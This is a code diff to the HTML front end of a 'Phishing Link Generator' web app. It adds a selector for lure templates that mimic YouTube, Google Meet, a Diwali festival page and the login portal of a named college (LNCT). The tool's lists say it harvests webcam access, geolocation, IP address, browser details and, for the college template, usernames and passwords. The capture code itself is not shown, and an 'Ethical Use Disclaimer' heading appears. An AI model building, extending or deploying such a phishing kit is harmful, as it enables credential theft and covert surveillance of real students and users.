@@ -28,14 +28,79 @@
             background-color: #ffe6e6;
             border-left: 4px solid #ff6666;
         }
+        .template-selector {
+            margin: 30px 0;
+            padding: 20px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ced4da;
+            font-size: 16px;
+        }
+        .submit-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background-color: #0069d9;
+        }
+        .template-description {
+            margin-top: 10px;
+            font-style: italic;
+            color: #6c757d;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Phishing Link Generator</h1>
-        <p>Below is your generated phishing link for educational purposes:</p>
         
+        <div class="template-selector">
+            <h2>Select Template Type</h2>
+            <p>Choose the type of phishing page you want to generate a link for:</p>
+            
+            <form action="/generate-link" method="get">
+                <div class="form-group">
+                    <label for="template">Page Template:</label>
+                    <select id="template" name="template" class="form-control" onchange="updateDescription()">
+                        <option value="default" {% if template == 'default' %}selected{% endif %}>Default Webcam Capture</option>
+                        <option value="festival" {% if template == 'festival' %}selected{% endif %}>Festival Celebration Page</option>
+                        <option value="youtube" {% if template == 'youtube' %}selected{% endif %}>YouTube Video Page</option>
+                        <option value="meet" {% if template == 'meet' %}selected{% endif %}>Video Meeting Page</option>
+                        <option value="college" {% if template == 'college' %}selected{% endif %}>LNCT College Login</option>
+                    </select>
+                </div>
+                
+                <div id="template-description" class="template-description">
+                    <!-- Template description will be populated by JavaScript -->
+                </div>
+                
+                <button type="submit" class="submit-btn">Generate Link</button>
+            </form>
+        </div>
+        
+        {% if link %}
         <div class="link-container">
+            <h3>Your Generated Link:</h3>
             <p id="phishing-link">{{ link }}</p>
             <button class="copy-btn" onclick="copyLink()">Copy Link</button>
         </div>
@@ -46,7 +111,11 @@
             <li>Geolocation data</li>
             <li>IP address</li>
             <li>Browser information</li>
+            {% if template == 'college' %}
+            <li>Login credentials (username and password)</li>
+            {% endif %}
         </ul>
+        {% endif %}
         
         <div class="disclaimer">
             <h3>⚠️ Ethical Use Disclaimer</h3>
@@ -65,6 +134,33 @@
     </div>
     
     <script>
+        // Function to update the template description based on selection
+        function updateDescription() {
+            const template = document.getElementById('template').value;
+            const descriptionElement = document.getElementById('template-description');
+            
+            switch(template) {
+                case 'default':
+                    descriptionElement.textContent = 'A basic page that requests webcam and location access after consent.';
+                    break;
+                case 'festival':
+                    descriptionElement.textContent = 'Mimics a Diwali festival celebration page with countdown timer and interactive elements.';
+                    break;
+                case 'youtube':
+                    descriptionElement.textContent = 'Resembles a YouTube video page with age verification requirement.';
+                    break;
+                case 'meet':
+                    descriptionElement.textContent = 'Simulates a Google Meet-like video conference joining page.';
+                    break;
+                case 'college':
+                    descriptionElement.textContent = 'Imitates the LNCT college portal login page with credential capture.';
+                    break;
+                default:
+                    descriptionElement.textContent = '';
+            }
+        }
+        
+        // Copy link to clipboard function
         function copyLink() {
             const linkText = document.getElementById('phishing-link').textContent;
             navigator.clipboard.writeText(linkText)
@@ -83,6 +179,9 @@
                     alert('Link copied to clipboard!');
                 });
         }
+        
+        // Initialize description on page load
+        document.addEventListener('DOMContentLoaded', updateDescription);
     </script>
 </body>
 </html>
